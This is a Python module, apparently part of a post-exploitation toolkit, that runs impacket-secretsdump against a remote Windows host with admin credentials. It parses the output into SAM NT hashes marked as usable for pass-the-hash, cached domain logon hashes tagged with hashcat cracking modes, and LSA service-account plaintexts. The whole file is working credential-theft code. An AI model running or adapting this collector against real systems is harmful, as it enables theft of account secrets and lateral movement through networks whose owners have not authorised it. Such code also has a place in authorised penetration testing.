"""SAM / LSA secrets / cached domain logons (DCC2) via impacket-secretsdump.

Needs local-admin on the target. Runs once per host (first credential that has
admin wins). Output is parsed into:
  - local SAM NT hashes            -> Status.HASH (usable for PtH)
  - LSA secrets (service accounts)  -> Status.CLEARTEXT when a plaintext is shown
  - cached domain logons (DCC2)     -> Status.HASH  (hashcat -m 2100, crack only)
  - machine account                 -> Status.HASH
"""
from __future__ import annotations

import re
from typing import List

from core.credential import Credential
from core.secret import Secret, Status
from core.tools import find_tool, run
from .base import BaseCollector

# Administrator:500:aad3b...:nthash:::
SAM_RE = re.compile(r"^([^:]+):(\d+):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::")
# DOMAIN/user:$DCC2$10240#user#hash:   (cached)
DCC2_RE = re.compile(r"^(.+?):(\$DCC2\$\d+#[^#]+#[0-9a-fA-F]+)")
# generic LSA cleartext secret line "name:value" after "Dumping LSA Secrets"


class SamLsaCollector(BaseCollector):
    name = "SAM/LSA"
    description = "SAM hashes, LSA secrets, cached domain logons (needs admin)"
    per_credential = False
    needs_admin = True            # local SAM/LSA dump requires local admin
    requires = ("secretsdump",)

    def collect_once(self, cred: Credential) -> List[Secret]:
        bin_ = find_tool("secretsdump")
        if not bin_:
            return []
        cmd = [bin_, cred.secretsdump_target(self.host)] + cred.impacket_extra_args()
        res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
                  raw_name=self._raw_name(cred))
        return self._parse(res.output)

    def _parse(self, out: str) -> List[Secret]:
        found: List[Secret] = []
        section = ""
        for line in out.splitlines():
            line = line.rstrip().replace("\x00", "")   # secretsdump emits stray nulls
            low = line.lower()
            if "dumping local sam" in low:
                section = "sam"; continue
            if "dumping cached domain" in low:
                section = "dcc2"; continue
            if "dumping lsa secrets" in low:
                section = "lsa"; continue

            m = SAM_RE.match(line)
            if m:
                user, _rid, _lm, nt = m.groups()
                found.append(Secret(self.host, "SAM", user, nt, Status.HASH,
                                    secret_type="nthash",
                                    notes="local account; PtH or hashcat -m 1000"))
                continue

            m = DCC2_RE.match(line)
            if m:
                user, h = m.groups()
                found.append(Secret(self.host, "DCC2", user, h, Status.HASH,
                                    secret_type="dcc2",
                                    notes="cached domain logon; crack only, hashcat -m 2100"))
                continue

            if section == "lsa":
                # machine account / service plaintext lines look like
                #   DOMAIN\svc_x:plain_password_hex:...   or  name: value
                if ":plain_password_hex:" in line or "plain_password" in low:
                    name = line.split(":", 1)[0]
                    found.append(Secret(self.host, "LSA", name,
                                        "(plaintext in raw output)", Status.CLEARTEXT,
                                        secret_type="password",
                                        notes="LSA secret plaintext - see raw file"))
                elif re.match(r"^\S+/\S+:.+", line) and "$" not in line.split(":")[0]:
                    name, val = line.split(":", 1)
                    if val and len(val) < 200:
                        found.append(Secret(self.host, "LSA", name, val,
                                            Status.CLEARTEXT, secret_type="password"))
        return found
